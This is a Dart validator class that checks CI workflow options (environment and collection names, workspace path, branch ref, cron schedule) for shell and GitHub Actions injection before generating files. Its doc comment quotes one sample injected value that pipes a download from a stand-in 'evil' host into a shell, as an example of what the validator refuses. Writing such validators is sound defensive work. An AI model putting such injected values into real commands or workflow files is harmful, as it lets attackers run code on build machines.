// Pure Dart.
import '../entities/ci_options.dart';
import 'cron_validator.dart';

/// Checks what the generated files would put into a shell command or a YAML document, so a value nobody should type
/// (an environment named `x"; curl evil | sh`, a workspace path that leaves the repository) is refused instead of
/// being quoted and hoped for. Names come from a workspace that a teammate may have edited.
abstract final class CiOptionsValidator {
  static final _control = RegExp(r'[\u0000-\u001f\u007f]');
  static final _refCharacters = RegExp(r'^[A-Za-z0-9._/-]+$');
  static final _pathCharacters = RegExp(r'^[A-Za-z0-9 _./@%+=,()-]+$');

  /// The fields that have a problem, by name, with a message that says what to change. Empty when [o] is usable.
  static Map<String, String> problems(CiOptions o) {
    final found = <String, String>{};
    final env = o.environment;
    if (env != null && env.isNotEmpty) {
      final why = _unsafeText('The environment name', env);
      if (why != null) found['environment'] = why;
    }
    final collection = o.collection;
    if (collection != null && collection.isNotEmpty) {
      final why = _unsafeText('The collection name', collection);
      if (why != null) found['collection'] = why;
    }
    final path = o.workspacePath.trim();
    if (path.isEmpty) {
      found['workspacePath'] = 'Enter the path of the workspace file in the repository, for example workspace.json.';
    } else if (path.startsWith('/') || RegExp(r'^[A-Za-z]:').hasMatch(path) || path.startsWith('~')) {
      found['workspacePath'] = 'Use a path inside the repository (relative to its root), not an absolute one.';
    } else if (path.split('/').contains('..')) {
      found['workspacePath'] = 'The workspace file must be inside the repository: remove the ".." from the path.';
    } else if (!_pathCharacters.hasMatch(path) || path.contains(r'${{')) {
      found['workspacePath'] = 'The path may only use letters, digits, spaces and _ . / @ % + = , ( ) - . Rename the folder or file if it has other characters.';
    }
    final ref = o.postpilotRef.trim();
    if (ref.isEmpty) {
      found['postpilotRef'] = 'Enter a branch, tag or commit of PostPilot, for example main.';
    } else if (!_refCharacters.hasMatch(ref) || ref.startsWith('-') || ref.contains('..')) {
      found['postpilotRef'] = 'A branch, tag or commit may only use letters, digits and . _ / - and cannot start with a dash.';
    }
    if (o.schedule == CiSchedulePreset.custom) {
      final why = CronValidator.validate(o.customCron);
      if (why != null) found['cron'] = why;
    }
    return found;
  }

  /// Text that goes into a command line: no control characters, and nothing GitHub would read as an expression.
  static String? _unsafeText(String what, String value) {
    if (_control.hasMatch(value)) return '$what has a line break or another control character; rename it.';
    if (value.contains(r'${{') || value.contains('}}')) {
      return '$what contains "\${{" or "}}", which GitHub Actions would read as an expression; rename it.';
    }
    return null;
  }

  /// The first problem, or null.
  static String? firstProblem(CiOptions o) => problems(o).values.firstOrNull;
}
